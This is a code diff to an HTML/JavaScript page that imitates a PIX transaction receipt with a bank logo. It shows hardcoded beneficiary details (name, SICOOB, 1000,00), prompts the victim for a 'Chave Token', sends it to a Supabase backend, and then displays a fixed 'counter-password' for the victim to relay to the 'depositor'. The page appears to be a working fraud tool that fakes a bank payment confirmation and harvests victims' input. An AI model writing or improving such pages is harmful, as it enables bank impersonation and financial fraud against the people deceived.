@@ -13,8 +13,9 @@
     <h2>Comprovante de Transação PIX</h2>
     
     <img id="logo" src="assets/bblogo.png" alt="Logo" width="300">
-    <p id="status">Para finalizar o depósito, digite a <strong>Chave Token</strong> informada pelo depositante. Após clique em PERMITIR para gerar a contrasenha.</p>
-    <input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()">
+    <p id="status">Para finalizar o depósito, confirma os dados do beneficiário e digite a <strong>Chave Token</strong> informada pelo depositante. Após clique em PERMITIR para gerar a contrasenha.</p>
+    <p id="dados"></p>
+    
     <input type="text" id="password" placeholder="Chave Token" >
     <button onclick="checkAndSend()">PERMITIR GERAR CONTRASENHA</button>
 
@@ -27,23 +28,26 @@
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
         // Nome fixo para validação
-        const NOME_FIXO = "RENATO TADEU PEREIRA";
+        //<input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()">
+        //const NOME_FIXO = "Renato Tadeu Pereira";
+        document.getElementById("dados").innerText = "Nome: Renato Tadeu Pereira\nBanco: SICOOB\nValor: 1000,00";
+        
         const CHAVE_PASSE = "754A38CF202548PP";
 
         function checkAndSend() {
-            const username = document.getElementById("username").value.trim();
+            //const username = document.getElementById("username").value.trim();
             const password = document.getElementById("password").value.trim();
             // Verificando se o campo de nome está vazio
-            if (!username) {
-                document.getElementById("status").innerText = "Nome não pode ser vazio";
-                return;
-            }
+            //if (!username) {
+               // document.getElementById("status").innerText = "Nome não pode ser vazio";
+                //return;
+           // }
             
             // Verificando se o nome digitado é o esperado
-            if (username !== NOME_FIXO.trim()) {
-                document.getElementById("status").innerText = "Nome incorreto. Tente novamente.";
-                return;
-            }
+            //if (username !== NOME_FIXO.trim()) {
+              //  document.getElementById("status").innerText = "Nome incorreto. Tente novamente.";
+                //return;
+           // }
             
             if (!password) {
                 document.getElementById("status").innerText = "Chave Token não pode estar em branco";
@@ -89,7 +93,8 @@
                     throw error;
                 }
 
-                document.getElementById("status").innerText = "Contra-senha gerada com sucesso!\nInforme este número ao depositante: 752JA54P2025BF82";
+                document.getElementById("status").innerText = "Contra-senha gerada com sucesso!";
+                document.getElementById("dados").innerText = "Informe este número ao depositante: 752JA54P2025BF82";
                 console.log("Dados enviados:", data);
             } catch (err) {
                 console.error("Erro ao enviar:", err.message);
